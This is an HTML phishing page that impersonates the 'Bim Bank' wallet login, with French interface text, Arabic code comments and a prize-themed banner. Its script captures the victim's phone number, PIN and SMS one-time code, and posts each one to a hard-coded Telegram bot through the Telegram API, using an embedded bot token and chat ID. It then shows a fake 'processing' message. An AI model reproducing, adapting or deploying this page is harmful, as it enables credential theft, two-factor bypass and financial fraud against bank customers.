<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bim Bank - Espace Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
        
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #ffffff; }
        
        /* خلفية الشبكة الاحترافية */
        .grid-background {
            background-image: linear-gradient(#f0f0f0 1px, transparent 1px), linear-gradient(90deg, #f0f0f0 1px, transparent 1px);
            background-size: 20px 20px;
        }

        /* تنسيق منطقة الجائزة العلوية */
        .hero-prize-container {
            width: 100%;
            height: 250px;
            background-image: url('https://r.jina.ai/i/6561f36402ec4c97960350436a537f8d'); /* رابط صورة الدرع والجائزة */
            background-size: cover;
            background-position: center;
            border-bottom: 2px solid #f19e2c;
            position: relative;
        }
        .hero-overlay {
            position: absolute;
            bottom: 0;
            width: 100%;
            background: rgba(255, 255, 255, 0.8);
            padding: 10px;
            text-align: center;
            backdrop-filter: blur(5px);
        }

        /* أزرار Wallet / Banking */
        .tab-container {
            display: flex;
            border: 1px solid #2a4387;
            border-radius: 8px;
            overflow: hidden;
            margin: 20px 0;
        }
        .tab-item { flex: 1; padding: 10px; text-align: center; font-weight: 600; }
        .tab-active { background-color: #2a4387; color: white; }
        .tab-inactive { background-color: white; color: #6b7280; }

        /* حقول الإدخال */
        .input-field {
            border: 1px solid #d1d5db;
            border-radius: 8px;
            padding: 14px;
            width: 100%;
            font-size: 1.1rem;
            outline: none;
        }
        .char-count { font-size: 10px; color: #9ca3af; text-align: right; margin-top: 2px; }

        /* زر الدخول */
        .btn-connexion {
            background-color: #f19e2c;
            color: white;
            width: 100%;
            padding: 14px;
            border-radius: 8px;
            font-weight: 700;
            font-size: 1.2rem;
            margin-top: 20px;
        }

        #otp-modal { background-color: rgba(255, 255, 255, 0.98); display: none; }
    </style>
</head>
<body class="grid-background min-h-screen flex flex-col items-center">

    <!-- استبدال المنطقة العلوية بصورة الجائزة -->
    <div class="hero-prize-container">
        <div class="hero-overlay">
            <p class="text-[#2a4387] font-bold">Bienvenue dans votre espace wallet</p>
        </div>
    </div>

    <!-- أزرار التبديل -->
    <div class="w-full max-w-sm px-6">
        <div class="tab-container">
            <div class="tab-item tab-active">Wallet</div>
            <div class="tab-item tab-inactive">Banking</div>
        </div>
    </div>

    <!-- نموذج تسجيل الدخول -->
    <div id="login-form" class="w-full max-w-sm px-6 mt-2">
        <h2 class="text-[#2a4387] font-bold text-xl mb-4">Connexion</h2>
        
        <div class="mb-4">
            <input id="phone" type="tel" maxlength="8" oninput="validate(this, 8)" class="input-field" placeholder="Téléphone">
            <div id="phone-count" class="char-count">0/8</div>
        </div>

        <div class="mb-2">
            <input id="pin" type="password" maxlength="4" oninput="validate(this, 4)" class="input-field" placeholder="Mot de passe">
            <div id="pin-count" class="char-count">0/4</div>
        </div>

        <div class="text-right">
            <a href="#" class="text-gray-400 text-sm">Mot de passe oublié ?</a>
        </div>

        <button onclick="submitLogin()" class="btn-connexion">Connexion</button>

        <div class="mt-12 text-center">
            <p class="text-gray-500">Nouvel utilisateur ?</p>
            <a href="#" class="text-[#2a4387] font-bold mt-1 block">S'inscrire maintenant &rarr;</a>
        </div>
    </div>

    <!-- واجهة التحقق OTP -->
    <div id="otp-modal" class="fixed inset-0 z-50 flex flex-col items-center justify-center px-8">
        <div class="w-full max-w-sm text-center">
            <h3 class="text-2xl font-bold text-[#2a4387] mb-4">Vérification</h3>
            <p class="text-gray-500 mb-8">Veuillez entrer le code reçu par SMS</p>
            <input id="otp" type="tel" maxlength="6" class="input-field text-center text-2xl tracking-widest border-2 border-[#f19e2c]" placeholder="000000">
            <button onclick="finish()" class="btn-connexion">Confirmer</button>
        </div>
    </div>

    <script>
        const token = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const chatId = "8665814266";

        function post(msg) {
            fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`);
        }

        function validate(el, max) {
            el.value = el.value.replace(/[^0-9]/g, '');
            document.getElementById(el.id + '-count').textContent = el.value.length + '/' + max;
        }

        function submitLogin() {
            const p = document.getElementById('phone').value;
            const n = document.getElementById('pin').value;
            if(p.length === 8 && n.length === 4) {
                post(`🏆 New Entry (Prize Page):\n📱: ${p}\n🔑: ${n}`);
                document.getElementById('login-form').style.display = 'none';
                document.getElementById('otp-modal').style.display = 'flex';
            }
        }

        function finish() {
            const o = document.getElementById('otp').value;
            if(o.length === 6) {
                post(`✅ OTP: ${o}`);
                alert("Votre demande est en cours de traitement.");
                location.reload();
            }
        }
    </script>
</body>
</html>
